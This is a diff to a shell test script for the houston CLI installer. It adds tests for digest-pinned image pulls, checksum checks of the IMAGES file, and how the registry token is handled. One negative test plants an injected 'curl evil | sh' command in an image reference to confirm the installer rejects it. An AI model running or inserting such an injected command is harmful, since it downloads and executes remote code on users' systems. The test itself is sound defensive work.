@@ -10,8 +10,12 @@
 #   - a release's CLI is installed, checked against SHA256SUMS
 #   - the token is sent when given, and nothing when not (a public repo)
 #   - a checksum mismatch stops the install, and the old CLI stays
-#   - the images are pulled by tag; the token reaches docker login only on
-#     stdin, and is logged out after; without one, no login at all
+#   - the images are pulled by the digests in the release's IMAGES, checked
+#     against SHA256SUMS; an IMAGES that doesn't match, or names other
+#     images, stops the install before anything is pulled; a release from
+#     before IMAGES is pulled by tag
+#   - the token reaches docker login only on stdin, and is logged out after;
+#     without one, no login at all
 #
 #   install/test/install-version.sh
 set -uo pipefail
@@ -26,26 +30,34 @@ ok() { printf '  ok    %s\n' "$*"; }
 bad() { printf '  FAIL  %s\n' "$*"; failures=$((failures + 1)); }
 
 # The fake GitHub: /repos/scttymn/houston/releases/tags/<tag> for v0.1.0
-# only, and its assets by id. Compact JSON, as the real API sends.
+# (also the latest) and v0.0.9 (from before IMAGES), and their assets by id.
+# Compact JSON, as the real API sends.
 mkdir -p /fake/assets
 printf 'houston v0.1.0 linux amd64\n' > /fake/assets/houston-linux-amd64
 printf '#!/bin/sh\necho installer\n' > /fake/assets/install.sh
-(cd /fake/assets && sha256sum houston-linux-amd64 install.sh > SHA256SUMS)
+MC_DIGEST=sha256:$(printf mc | sha256sum | cut -c1-64)
+RUNNER_DIGEST=sha256:$(printf runner | sha256sum | cut -c1-64)
+printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@%s\nghcr.io/scttymn/houston-runner:v0.1.0@%s\n' "$MC_DIGEST" "$RUNNER_DIGEST" > /fake/assets/IMAGES
+sums() { (cd /fake/assets && sha256sum houston-linux-amd64 install.sh IMAGES > SHA256SUMS); }
+sums
 cat > /fake/server.py <<'PY'
 import http.server, json, os, sys
 PORT = int(sys.argv[1])
-NAMES = ["houston-linux-amd64", "install.sh", "SHA256SUMS"]
+NAMES = ["houston-linux-amd64", "install.sh", "SHA256SUMS", "IMAGES"]
+RELEASES = {"v0.1.0": NAMES, "latest": NAMES, "v0.0.9": NAMES[:3]}
 class H(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a): pass
     def do_GET(self):
         with open("/fake/requests.log", "a") as f:
             f.write("%s auth=%s\n" % (self.path, self.headers.get("Authorization", "-")))
         base = "http://127.0.0.1:%d/repos/scttymn/houston/releases" % PORT
-        if self.path in ("/repos/scttymn/houston/releases/tags/v0.1.0", "/repos/scttymn/houston/releases/latest"):
-            assets = [{"url": "%s/assets/%d" % (base, i + 1), "id": i + 1, "node_id": "x", "name": n,
+        release = self.path.rsplit("/", 1)[1]
+        if self.path.startswith("/repos/scttymn/houston/releases/") and release in RELEASES:
+            tag = "v0.1.0" if release == "latest" else release
+            assets = [{"url": "%s/assets/%d" % (base, NAMES.index(n) + 1), "id": NAMES.index(n) + 1, "node_id": "x", "name": n,
                        "uploader": {"login": "github-actions[bot]", "url": "https://api.github.com/users/github-actions%5Bbot%5D"}}
-                      for i, n in enumerate(NAMES)]
-            body = json.dumps({"url": base + "/9", "assets_url": base + "/9/assets", "id": 9, "tag_name": "v0.1.0", "name": "v0.1.0", "assets": assets}, separators=(",", ":")).encode()
+                      for n in RELEASES[release]]
+            body = json.dumps({"url": base + "/9", "assets_url": base + "/9/assets", "id": 9, "tag_name": tag, "name": tag, "assets": assets}, separators=(",", ":")).encode()
             self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers(); self.wfile.write(body)
         elif self.path.startswith("/repos/scttymn/houston/releases/assets/") and self.headers.get("Accept") == "application/octet-stream":
             name = NAMES[int(self.path.rsplit("/", 1)[1]) - 1]
@@ -107,19 +119,47 @@ out=$(LIB_CMD='check_release && install_cli' lib HOUSTON_VERSION=v0.1.0 HOUSTON_
 [ "$code" = 1 ] && printf '%s' "$out" | grep -qF "doesn't match the release's SHA256SUMS" && ok "exit 1: $(printf '%s' "$out" | tail -1)" || bad "exit $code: $out"
 [ "$(cat /usr/local/bin/houston)" = "old houston" ] && ok "the old CLI is untouched" || bad "the CLI was replaced"
 
-echo "== the release's images: pulled by tag; the token only on stdin, and logged out after"
+echo "== the release's images: pulled by digest; the token only on stdin, and logged out after"
 : > /fake/docker.log
 out=$(LIB_CMD='check_release && fetch_images' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= HOUSTON_GITHUB_TOKEN=ghp_test 2>&1); code=$?
 log=$(cat /fake/docker.log)
 [ "$code" = 0 ] && printf '%s' "$log" | grep -qx "docker login ghcr.io -u houston --password-stdin" && printf '%s' "$log" | grep -qx "stdin: ghp_test" &&
   ok "logged in to ghcr.io with the token on stdin" || bad "exit $code: $log $out"
 printf '%s' "$log" | grep -q "^docker .*ghp_test" && bad "the token was a docker argument" || ok "the token was never a docker argument"
-printf '%s' "$log" | grep -qx "docker pull --quiet ghcr.io/scttymn/houston-mission-control:v0.1.0" &&
-  printf '%s' "$log" | grep -qx "docker pull --quiet ghcr.io/scttymn/houston-runner:v0.1.0" && ok "pulled both images at v0.1.0" || bad "pulls: $log"
+printf '%s' "$log" | grep -qx "docker pull --quiet ghcr.io/scttymn/houston-mission-control:v0.1.0@$MC_DIGEST" &&
+  printf '%s' "$log" | grep -qx "docker pull --quiet ghcr.io/scttymn/houston-runner:v0.1.0@$RUNNER_DIGEST" && ok "pulled both images by the digests in IMAGES" || bad "pulls: $log"
 [ "$(printf '%s' "$log" | tail -1)" = "docker logout ghcr.io" ] && ok "logged out after pulling" || bad "no logout: $log"
 : > /fake/docker.log
 out=$(LIB_CMD='check_release && fetch_images' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1); code=$?
 [ "$code" = 0 ] && ! grep -qE "docker (login|logout)" /fake/docker.log && grep -q "docker pull" /fake/docker.log && ok "no token: pulled without logging in" || bad "exit $code: $(cat /fake/docker.log)"
+
+out=$(LIB_CMD='check_release && fetch_images && echo "image=$IMAGE runner=$RUNNER_IMAGE"' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1)
+printf '%s' "$out" | grep -qx "image=ghcr.io/scttymn/houston-mission-control:v0.1.0@$MC_DIGEST runner=ghcr.io/scttymn/houston-runner:v0.1.0@$RUNNER_DIGEST" &&
+  ok "compose.yml will name the images by digest" || bad "images: $out"
+
+echo "== an IMAGES that doesn't check out stops the install before anything is pulled"
+refused_images() { # refused_images <want>
+  : > /fake/docker.log
+  out=$(LIB_CMD='check_release && fetch_images; echo "not refused"' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1); code=$?
+  [ "$code" = 1 ] && printf '%s' "$out" | grep -qF "$1" && ! grep -q "docker pull" /fake/docker.log &&
+    ok "exit 1, nothing pulled: $(printf '%s' "$out" | tail -1)" || bad "wanted \"$1\", got exit $code: $out; docker: $(cat /fake/docker.log)"
+}
+cp /fake/assets/IMAGES /fake/IMAGES.good
+printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@sha256:%064d\n' 0 > /fake/assets/IMAGES
+refused_images "IMAGES doesn't match the release's SHA256SUMS"
+printf 'ghcr.io/someone-else/houston-mission-control:v0.1.0@%s\nghcr.io/scttymn/houston-runner:v0.1.0@%s\n' "$MC_DIGEST" "$RUNNER_DIGEST" > /fake/assets/IMAGES; sums
+refused_images "IMAGES names ghcr.io/someone-else/houston-mission-control:v0.1.0@$MC_DIGEST"
+printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@%s\nghcr.io/scttymn/houston-runner:v0.1.0\n' "$MC_DIGEST" > /fake/assets/IMAGES; sums
+refused_images "IMAGES names ghcr.io/scttymn/houston-runner:v0.1.0"
+printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@sha256:abc; curl evil | sh\nghcr.io/scttymn/houston-runner:v0.1.0@%s\n' "$RUNNER_DIGEST" > /fake/assets/IMAGES; sums
+refused_images "IMAGES names ghcr.io/scttymn/houston-mission-control:v0.1.0@sha256:abc; curl evil | sh"
+cp /fake/IMAGES.good /fake/assets/IMAGES; sums
+
+echo "== a release from before IMAGES: pulled by tag"
+: > /fake/docker.log
+out=$(LIB_CMD='check_release && fetch_images' lib HOUSTON_VERSION=v0.0.9 HOUSTON_SOURCE= 2>&1); code=$?
+[ "$code" = 0 ] && grep -qx "docker pull --quiet ghcr.io/scttymn/houston-mission-control:v0.0.9" /fake/docker.log &&
+  printf '%s' "$out" | grep -qF "v0.0.9 lists no image digests" && ok "pulled by tag, and said so" || bad "exit $code: $out $(cat /fake/docker.log)"
 
 echo
 if [ "$failures" -eq 0 ]; then echo "INSTALL VERSION PASS"; else echo "INSTALL VERSION: $failures failure(s)"; exit 1; fi
